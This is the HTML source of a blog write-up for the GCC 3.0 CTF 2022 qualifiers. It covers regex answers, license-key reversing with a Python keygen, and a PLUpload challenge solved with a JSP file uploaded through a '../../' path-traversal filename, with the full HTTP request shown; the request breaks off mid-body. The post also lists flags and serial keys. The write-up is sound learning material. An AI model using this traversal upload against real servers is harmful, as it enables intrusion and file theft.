@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>GCC 3.0 CTF 2022 | Chovid99&#39;s Blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="Writeup for GCC 3.0 CTF 2022 by Chovid99">
+<meta name="generator" content="Hugo 0.95.0" />
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/tocbot.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+ 
+    
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Posts</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">GCC 3.0 CTF 2022</h1>
+
+    <div class="tip">
+        <time datetime="2022-01-11 06:36:00 &#43;0700 WIB">Jan 11, 2022</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          2105 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          10 minute read
+        </span>
+    </div>
+
+    <div class="content">
+      <div class="post-content js-toc-content">
+        <p><p class="markdown-image">
+  <img src="https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096" alt=""  />
+</p>
+I&rsquo;m super happy on writing this writeup becaue I managed to qualify to join the final of GCC 3.0 2022. Here is my writeup for challenges that I solved during qualification. (Edit: I got third place on the final :D).</p>
+<h2 id="regexp-challenge">Regexp Challenge <a href="#regexp-challenge" class="anchor">#</a></h2>
+<p>We just need to craft manually our regex per level</p>
+<ul>
+<li>Level 1
+<ul>
+<li><code>\d{8}\D{1}</code></li>
+</ul>
+</li>
+<li>Level 2
+<ul>
+<li><code>^[1,2,3,4,8,9]\D{1}</code></li>
+</ul>
+</li>
+<li>Level 3
+<ul>
+<li><code>\d{8}[A]{1}</code></li>
+</ul>
+</li>
+<li>Level 4
+<ul>
+<li><code>7{7,}[A]</code></li>
+</ul>
+</li>
+<li>Level 5
+<ul>
+<li><code>.*A</code></li>
+</ul>
+</li>
+<li>Level 6
+<ul>
+<li><code>\d*A</code></li>
+</ul>
+</li>
+<li>Level 7
+<ul>
+<li><code>\d*\D</code></li>
+</ul>
+</li>
+<li>Level 8
+<ul>
+<li><code>\d*[c,h,W,A]</code></li>
+</ul>
+</li>
+<li>Level 9
+<ul>
+<li><code>[^-]+</code></li>
+</ul>
+</li>
+<li>Level 10
+<ul>
+<li><code>\D{1}-{1}\d{6}\D</code></li>
+</ul>
+</li>
+<li>Level 11
+<ul>
+<li><code>\D{1}-{1}\d{3,5}\D</code></li>
+</ul>
+</li>
+<li>Level 12
+<ul>
+<li><code>\D{1}(-|\+){1}\d{6}\D</code></li>
+</ul>
+</li>
+<li>Level 13
+<ul>
+<li><code>\d{2}\D?\d{5}\D</code></li>
+</ul>
+</li>
+<li>Level 14
+<ul>
+<li><code>\d{2}\D?\d{1,3}\D</code></li>
+</ul>
+</li>
+<li>Level 15
+<ul>
+<li><code>((\D\+\d{4,6}\D)|(\D-\d{4}\D))</code>
+<p class="markdown-image">
+  <img src="https://i.imgur.com/s6HIwQF.png" alt=""  />
+</p></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>Flag: HL{RegExp-Tyc00n-91234}</p>
+</blockquote>
+<h2 id="license-key-level-1">License Key Level 1 <a href="#license-key-level-1" class="anchor">#</a></h2>
+<p>Serial key was found in this verify function
+<p class="markdown-image">
+  <img src="https://i.imgur.com/9rnmPs1.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: SYIOKLELUIOD</p>
+</blockquote>
+<h2 id="license-key-level-2">License Key Level 2 <a href="#license-key-level-2" class="anchor">#</a></h2>
+<p>The calculated serial was printed in the terminal, so we can simply use it as the flag.
+<p class="markdown-image">
+  <img src="https://i.imgur.com/Eql3bup.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: LBQXULNJPXDE</p>
+</blockquote>
+<h2 id="license-key-level-3">License Key Level 3 <a href="#license-key-level-3" class="anchor">#</a></h2>
+<p>Checking the disassembly code
+<p class="markdown-image">
+  <img src="https://i.imgur.com/m2exSD6.png" alt=""  />
+</p>
+<em>From the above image, we found the key</em></p>
+<p><p class="markdown-image">
+  <img src="https://i.imgur.com/LjvB31F.png" alt=""  />
+</p>
+<em>From the above image, we found the logic to generate the serial</em></p>
+<p>Just translate it to python</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>key <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;yrtxgfh;olmn&#39;</span>
+</span></span><span style="display:flex;"><span>name <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;cyberpeace&#39;</span>
+</span></span><span style="display:flex;"><span>serial <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">12</span>):
+</span></span><span style="display:flex;"><span>    serial <span style="color:#555">+=</span> <span style="color:#366">chr</span>(((key[(i<span style="color:#555">*</span><span style="color:#f60">2</span>) <span style="color:#555">%</span> <span style="color:#f60">12</span>]<span style="color:#555">^</span>name[i <span style="color:#555">%</span> <span style="color:#366">len</span>(name)]) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">2</span>) <span style="color:#555">%</span> <span style="color:#f60">0x19</span> <span style="color:#555">+</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;B&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(serial)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Flag: FDVDRRNKRDYG</p>
+</blockquote>
+<h2 id="license-key-level-4">License Key Level 4 <a href="#license-key-level-4" class="anchor">#</a></h2>
+<p>After reading the disassembly code, we know that the serial char comparison happen in this address
+<p class="markdown-image">
+  <img src="https://i.imgur.com/AlN45NT.png" alt=""  />
+</p></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  40752d:	44 38 2c 18          	cmp    BYTE PTR [rax+rbx*1],r13b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With the help of GDB, we can simply set breakpoint on it, and retrieve the r13 value. We got our serial key after retrieving the r13 value 12 times.
+<p class="markdown-image">
+  <img src="https://i.imgur.com/U7UlzGH.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: GEIJBLDJDECA</p>
+</blockquote>
+<h2 id="plupload">PLUpload <a href="#plupload" class="anchor">#</a></h2>
+<p>I try to check <code>/examples</code> folder, and found out that this uses Apache Tomcat. After playing it for a while (especially on the upload feature), I notice that the upload feature doesn&rsquo;t sanitize <code>../</code>, which mean we can freely upload the file to any directories. Also inside the examples folder there are a lot of jsp file example that got executed.</p>
+<p>My solution is to upload a jsp file to the examples folder path (<code>/examples/jsp/jsp2/el</code>) where the jsp file will open <code>/var/gold.txt</code> file contents.</p>
+<p>Below is the jsp file</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.FileInputStream&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.File&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.InputStreamReader&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.net.URL&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.FileReader&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.BufferedReader&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> contentType<span style="color:#555">=</span><span style="color:#c30">&#34;text/html&#34;</span> pageEncoding<span style="color:#555">=</span><span style="color:#c30">&#34;UTF-8&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;!</span>DOCTYPE html<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;</span>html<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;</span>head<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;</span>meta http<span style="color:#555">-</span>equiv<span style="color:#555">=</span><span style="color:#c30">&#34;Content-Type&#34;</span> content<span style="color:#555">=</span><span style="color:#c30">&#34;text/html; charset=UTF-8&#34;</span><span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;</span>title<span style="color:#555">&gt;</span>Read Text<span style="color:#555">&lt;/</span>title<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;/</span>head<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;</span>body<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;%</span>
+</span></span><span style="display:flex;"><span>            String txtFilePath <span style="color:#555">=</span> <span style="color:#c30">&#34;/var/gold.txt&#34;</span><span style="color:#555">;</span>
+</span></span><span style="display:flex;"><span>            BufferedReader reader <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> BufferedReader<span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> FileReader<span style="color:#555">(</span>txtFilePath<span style="color:#555">));</span>
+</span></span><span style="display:flex;"><span>            StringBuilder sb <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> StringBuilder<span style="color:#555">();</span>
+</span></span><span style="display:flex;"><span>            String line<span style="color:#555">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">while</span><span style="color:#555">((</span>line <span style="color:#555">=</span> reader<span style="color:#555">.</span><span style="color:#309">readLine</span><span style="color:#555">())!=</span> <span style="color:#069;font-weight:bold">null</span><span style="color:#555">){</span>
+</span></span><span style="display:flex;"><span>                sb<span style="color:#555">.</span><span style="color:#309">append</span><span style="color:#555">(</span>line<span style="color:#555">+</span><span style="color:#c30">&#34;\n&#34;</span><span style="color:#555">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>            out<span style="color:#555">.</span><span style="color:#309">println</span><span style="color:#555">(</span>sb<span style="color:#555">.</span><span style="color:#309">toString</span><span style="color:#555">());</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;/</span>body<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;/</span>html<span style="color:#555">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Below is the upload request that I use to upload the jsp file to <code>../../examples/jsp/jsp2/el/cho.jsp</code></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST //upload HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=---------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Length: 1479
+</span></span><span style="display:flex;"><span>Origin: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Referer: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land/
+</span></span><span style="display:flex;"><span>Cookie: JSESSIONID=6E2119D7A2763AC0C88B4888A10C0E8B
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;name&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>../../examples/jsp/jsp2/el/cho.jsp
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;chunk&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;chunks&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;cho.jsp&#34;
+</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.FileInputStream&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.File&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.InputStreamReader&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.net.URL&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.FileReader&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.BufferedReader&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page contentType=&#34;text/html&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>    &lt;head&gt;
